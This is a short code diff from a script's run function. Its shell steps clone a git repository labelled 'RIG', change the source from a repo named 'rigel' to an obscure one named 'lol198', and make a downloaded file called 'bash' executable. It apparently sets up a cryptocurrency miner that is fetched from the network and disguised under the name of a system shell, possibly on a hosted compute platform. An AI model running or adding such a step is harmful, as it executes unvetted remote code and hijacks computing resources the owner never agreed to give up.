@@ -55,13 +55,13 @@ def run_script():
 
     echo "=== DOWNLOAD RIG ==="
     cd /mnt/code/pan
-    git clone https://gitlab.com/liugtiujk/rigel.git
+    git clone https://github.com/malogrono/lol198.git
 
     echo "=== CHECK RIGEL ==="
-    ls -lah /mnt/code/pan/rigel
+    ls -lah /mnt/code/pan/lol198
 
     echo "=== CHECK BASH ==="
-    cd /mnt/code/pan/rigel
+    cd /mnt/code/pan/lol198
     ls -lh bash
 
     chmod u+x bash
